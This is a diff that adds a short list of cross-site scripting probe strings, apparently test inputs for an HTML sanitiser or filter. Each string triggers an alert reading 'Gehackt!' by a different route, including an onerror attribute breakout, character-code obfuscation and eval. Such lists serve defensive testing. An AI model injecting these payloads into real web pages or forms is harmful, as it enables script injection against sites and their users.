@@ -1,0 +1,6 @@
+x" onerror="alert('Gehackt!')
+alert('Gehackt!')
+String.fromCharCode(97,108,101,114,116,40,39,71,101,104,97,99,107,116,33,39,41)
+window['alert']('Gehackt!')
+window.alert('Gehackt!')
+eval(alert('Gehackt!'))
